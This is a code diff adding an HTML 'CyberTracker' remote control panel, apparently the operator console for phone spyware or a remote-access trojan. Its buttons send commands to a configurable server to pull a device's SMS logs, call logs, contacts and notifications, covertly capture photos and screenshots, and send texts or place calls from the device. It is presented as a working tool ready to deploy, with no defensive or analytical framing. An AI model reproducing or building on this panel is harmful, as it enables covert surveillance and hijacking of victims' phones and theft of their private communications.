@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberTracker Control Panel</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: #1a1a1a;
+            color: #fff;
+            padding: 20px;
+        }
+        h1 { color: #00ffcc; }
+        .container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        button {
+            background: #00ffcc;
+            color: #1a1a1a;
+            border: none;
+            padding: 12px 18px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #007a66;
+            color: white;
+        }
+        #output {
+            background: #333;
+            color: #00ffcc;
+            padding: 15px;
+            margin-top: 20px;
+            white-space: pre-wrap;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <h1>CyberTracker - Remote Control Panel</h1>
+    <div class="container">
+        <button onclick="sendCommand('fetch_device_info')">📱 Fetch Device Info</button>
+        <button onclick="sendCommand('fetch_sms_logs')">📩 View SMS Logs</button>
+        <button onclick="sendCommand('fetch_call_logs')">📞 View Call Logs</button>
+        <button onclick="sendCommand('fetch_contacts')">📖 View Contacts</button>
+        <button onclick="sendCommand('fetch_notifications')">🔔 View Notifications</button>
+        <button onclick="sendCommand('capture_photo')">📷 Capture Photo</button>
+        <button onclick="sendCommand('take_screenshot')">🖥 Capture Screenshot</button>
+        <button onclick="sendSMS()">📤 Send SMS</button>
+        <button onclick="makeCall()">📲 Make Call</button>
+        <button onclick="changeWallpaper()">🖼 Change Wallpaper</button>
+    </div>
+    <div id="output"></div>
+
+    <script>
+        const SERVER_URL = "https://your-app.onrender.com"; // Replace with your actual Render URL
+
+        function sendCommand(action, params = {}) {
+            fetch(SERVER_URL + "/send_command", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ action, params })
+            })
+            .then(response => response.json())
+            .then(data => document.getElementById("output").innerText = JSON.stringify(data, null, 2))
+            .catch(error => console.error("Error:", error));
+        }
+
+        function sendSMS() {
+            let number = prompt("Enter Phone Number:");
+            let message = prompt("Enter Message:");
+            sendCommand("send_sms", { number, message });
+        }
+
+        function makeCall() {
+            let number = prompt("Enter Phone Number:");
+            sendCommand("make_call", { number });
+        }
+
+        function changeWallpaper() {
+            let imageUrl = prompt("Enter Image URL:");
+            sendCommand("change_wallpaper", { url: imageUrl });
+        }
+    </script>
+</body>
+</html>
